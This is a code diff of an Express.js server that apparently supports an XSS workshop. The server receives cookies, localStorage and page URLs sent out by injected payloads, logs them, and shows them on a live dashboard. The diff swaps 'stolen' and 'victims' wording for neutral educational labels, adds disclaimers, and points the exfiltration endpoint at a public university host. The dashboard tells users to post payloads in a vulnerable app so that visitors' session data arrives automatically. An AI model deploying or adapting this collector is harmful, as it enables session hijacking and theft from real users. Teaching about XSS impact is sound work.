@@ -5,13 +5,13 @@ const path = require('path');
 const app = express();
 const PORT = 4000;  // Different port from vulnerable app
 
-// Store stolen data in memory
-const stolenData = [];
+// Store exfiltrated data in memory (for educational purposes)
+const exfiltratedData = [];
 
 app.use(express.json({ limit: '10mb' }));
 
 // ===== EXFILTRATION ENDPOINT =====
-// This simulates an attacker-controlled server receiving stolen data
+// This simulates data collection for educational demonstration
 
 app.get('/exfil', (req, res) => {
   const timestamp = new Date().toISOString();
@@ -27,17 +27,17 @@ app.get('/exfil', (req, res) => {
     ip: req.ip
   };
   
-  stolenData.push(data);
+  exfiltratedData.push(data);
   
   // Log to console
-  console.log('\n🚨 STOLEN DATA RECEIVED (GET):');
+  console.log('\n🚨 DATA RECEIVED (GET):');
   console.log('Time:', timestamp);
   console.log('Data:', req.query);
   console.log('Referer:', req.headers['referer']);
   
   // Log to file
-  fs.appendFileSync('attacker.log', 
-    `\n[${ timestamp}] GET - ${JSON.stringify(data, null, 2)}\n` + 
+  fs.appendFileSync('exfiltration.log', 
+    `\n[${timestamp}] GET - ${JSON.stringify(data, null, 2)}\n` + 
     '='.repeat(80) + '\n'
   );
   
@@ -60,10 +60,10 @@ app.post('/exfil', (req, res) => {
     ip: req.ip
   };
   
-  stolenData.push(data);
+  exfiltratedData.push(data);
   
   // Log to console with colors
-  console.log('\n🚨 STOLEN DATA RECEIVED (POST):');
+  console.log('\n🚨 DATA RECEIVED (POST):');
   console.log('Time:', timestamp);
   console.log('Cookie:', req.body.cookie);
   console.log('LocalStorage:', req.body.localStorage);
@@ -71,7 +71,7 @@ app.post('/exfil', (req, res) => {
   console.log('Referer:', req.headers['referer']);
   
   // Log to file
-  fs.appendFileSync('attacker.log', 
+  fs.appendFileSync('exfiltration.log', 
     `\n[${timestamp}] POST - ${JSON.stringify(data, null, 2)}\n` + 
     '='.repeat(80) + '\n'
   );
@@ -89,7 +89,7 @@ app.get('/', (req, res) => {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>🏴‍☠️ Attacker Dashboard</title>
+  <title>� XSS Demonstration Dashboard</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
   <style>
     body { 
@@ -185,41 +185,53 @@ app.get('/', (req, res) => {
 </head>
 <body>
   <div class="container py-4">
+    
+    <!-- Educational Disclaimer -->
+    <div class="alert alert-warning border-warning mb-4" style="background: #2a2a00; color: #ffff00;">
+      <h5 class="alert-heading">⚠️ EDUCATIONAL PURPOSES ONLY</h5>
+      <p class="mb-0">
+        <strong>IMPORTANT DISCLAIMER:</strong> This dashboard is part of a cybersecurity education workshop. 
+        It demonstrates how XSS (Cross-Site Scripting) vulnerabilities can be exploited. 
+        The techniques shown here are for <strong>educational purposes only</strong> and must never be used on systems 
+        without explicit authorization. Unauthorized access to computer systems is illegal and unethical.
+      </p>
+    </div>
+    
     <div class="text-center mb-4">
-      <div class="skull">☠️</div>
-      <h1 class="blink">ATTACKER DASHBOARD</h1>
-      <p class="text-warning">Exfiltrated Data Collection Server</p>
-      <p class="text-muted small">Running on: http://localhost:${PORT}</p>
+      <div class="skull">🎓</div>
+      <h1>XSS DEMONSTRATION DASHBOARD</h1>
+      <p class="text-warning">Educational Data Collection Server</p>
+      <p class="text-white small">Running on: https://project-1-17.eduhk.hk</p>
     </div>
 
     <!-- Stats -->
     <div class="stats">
       <div class="stat-card">
-        <div class="stat-number" id="totalCount">${stolenData.length}</div>
-        <div class="stat-label">TOTAL VICTIMS</div>
+        <div class="stat-number" id="totalCount">${exfiltratedData.length}</div>
+        <div class="stat-label">TOTAL REQUESTS</div>
       </div>
       <div class="stat-card">
-        <div class="stat-number" id="sessionCount">${stolenData.filter(d => d.body?.cookie).length}</div>
-        <div class="stat-label">SESSIONS STOLEN</div>
+        <div class="stat-number" id="sessionCount">${exfiltratedData.filter(d => d.body?.cookie).length}</div>
+        <div class="stat-label">SESSIONS CAPTURED</div>
       </div>
       <div class="stat-card">
-        <div class="stat-number" id="cookieCount">${stolenData.filter(d => d.query?.data || d.body?.cookie).length}</div>
-        <div class="stat-label">COOKIES CAPTURED</div>
+        <div class="stat-number" id="cookieCount">${exfiltratedData.filter(d => d.query?.data || d.body?.cookie).length}</div>
+        <div class="stat-label">COOKIES RECEIVED</div>
       </div>
     </div>
 
-    <!-- Stolen Data Display -->
+    <!-- Exfiltrated Data Display -->
     <div class="card">
       <div class="card-header">
         <div class="d-flex justify-content-between align-items-center">
-          <strong>📡 EXFILTRATED DATA (${stolenData.length} entries)</strong>
+          <strong>📡 EXFILTRATED DATA (${exfiltratedData.length} entries)</strong>
           <button class="btn btn-sm btn-outline-danger" onclick="clearData()">🗑️ Clear All</button>
         </div>
       </div>
       <div class="card-body" id="dataContainer">
-        ${stolenData.length === 0 ? 
-          '<p class="text-center text-muted">No data stolen yet. Waiting for victims...</p>' :
-          stolenData.slice().reverse().map((item, index) => `
+        ${exfiltratedData.length === 0 ? 
+          '<p class="text-center text-white">No data captured yet. Waiting for demonstration...</p>' :
+          exfiltratedData.slice().reverse().map((item, index) => `
             <div class="stolen-item">
               <div class="d-flex justify-content-between mb-2">
                 <strong class="timestamp">⏰ ${item.timestamp}</strong>
@@ -228,7 +240,7 @@ app.get('/', (req, res) => {
               
               ${item.body?.cookie ? `
                 <div class="mb-2">
-                  <strong class="cookie">🍪 COOKIE:</strong>
+                  <strong class="cookie">🍪 SESSION COOKIE:</strong>
                   <pre class="mb-1">${item.body.cookie}</pre>
                 </div>
               ` : ''}
@@ -242,7 +254,7 @@ app.get('/', (req, res) => {
               
               ${item.body?.url || item.query?.data ? `
                 <div class="mb-2">
-                  <strong class="url">🔗 ${item.body?.url ? 'VICTIM URL' : 'STOLEN DATA'}:</strong>
+                  <strong class="url">🔗 ${item.body?.url ? 'SOURCE URL' : 'CAPTURED DATA'}:</strong>
                   <pre class="mb-1">${item.body?.url || item.query?.data}</pre>
                 </div>
               ` : ''}
@@ -254,7 +266,7 @@ app.get('/', (req, res) => {
                 </div>
               ` : ''}
               
-              <div class="small text-muted">
+              <div class="small text-white">
                 <strong>🌐 Referer:</strong> ${item.headers.referer || 'N/A'}<br>
                 <strong>🖥️ User-Agent:</strong> ${item.headers['user-agent'] || 'N/A'}<br>
                 <strong>📍 IP:</strong> ${item.ip}
@@ -268,18 +280,18 @@ app.get('/', (req, res) => {
     <!-- Instructions -->
     <div class="card mt-4">
       <div class="card-header">
-        <strong>📚 HOW TO USE THIS DASHBOARD</strong>
+        <strong>📚 HOW TO USE THIS DEMONSTRATION</strong>
       </div>
       <div class="card-body text-white">
         <ol class="text-white">
-          <li>Update XSS payloads to point to: <code style="color: #00ff00;">https://project-1-17.eduhk.hk/exfil</code></li>
-          <li>Post the payload in the vulnerable app's comment board</li>
-          <li>When victims view the page, their data appears here automatically</li>
-          <li>This page auto-refreshes every 3 seconds to show new victims</li>
+          <li>Use the example XSS payloads below in the vulnerable chatbot's comment board</li>
+          <li>Post the payload to demonstrate the vulnerability</li>
+          <li>When users view the page, their session data appears here automatically</li>
+          <li>This page auto-refreshes every 3 seconds to show new data</li>
         </ol>
         
         <div class="mt-3">
-          <strong style="color: #ffaa00;">🎯 Example Payloads (click to copy):</strong>
+          <strong style="color: #ffaa00;">🎯 Example XSS Payloads (click to copy):</strong>
           
           <div class="payload-container">
             <button class="copy-btn" onclick="copyPayload(this, 0)">📋 COPY</button>
@@ -334,38 +346,39 @@ app.get('/', (req, res) => {
 
 // Clear all data endpoint
 app.post('/clear', (req, res) => {
-  stolenData.length = 0;
-  console.log('\n🗑️ All stolen data cleared');
+  exfiltratedData.length = 0;
+  console.log('\n🗑️ All demonstration data cleared');
   res.json({ success: true });
 });
 
 // Get data as JSON (for API access)
 app.get('/api/stolen', (req, res) => {
-  res.json({ count: stolenData.length, data: stolenData });
+  res.json({ count: exfiltratedData.length, data: exfiltratedData });
 });
 
 app.listen(PORT, () => {
   console.log(`
 ╔════════════════════════════════════════════════════════════════╗
 ║                                                                ║
-║         🏴‍☠️  ATTACKER SERVER - EXFILTRATION ENDPOINT  🏴‍☠️        ║
+║    �  XSS DEMONSTRATION SERVER - EDUCATIONAL USE ONLY  �     ║
 ║                                                                ║
-║   Dashboard: http://localhost:${PORT}                            ║
-║   Exfil Endpoint: http://localhost:${PORT}/exfil                ║
-║   API: http://localhost:${PORT}/api/stolen                       ║
+║   Dashboard: https://project-1-17.eduhk.hk                    ║
+║   Exfil Endpoint: https://project-1-17.eduhk.hk/exfil        ║
+║   API: https://project-1-17.eduhk.hk/api/stolen              ║
 ║                                                                ║
-║   📝 Logs saved to: attacker.log                               ║
+║   📝 Logs saved to: exfiltration.log                          ║
 ║                                                                ║
-║   ⚠️  EDUCATIONAL DEMO - Shows stolen session data in          ║
-║   real-time. Students can see the impact of XSS attacks!       ║
+║   ⚠️  EDUCATIONAL DEMO - This demonstrates XSS impact for      ║
+║   cybersecurity education. Never use these techniques on       ║
+║   systems without explicit authorization!                      ║
 ║                                                                ║
 ╚════════════════════════════════════════════════════════════════╝
 
 🎯 Update your XSS payloads to use:
-   http://localhost:${PORT}/exfil
+   https://project-1-17.eduhk.hk/exfil
 
-📊 View stolen data dashboard:
-   http://localhost:${PORT}
+📊 View demonstration dashboard:
+   https://project-1-17.eduhk.hk
 
 🔄 Dashboard auto-refreshes every 3 seconds
   `);
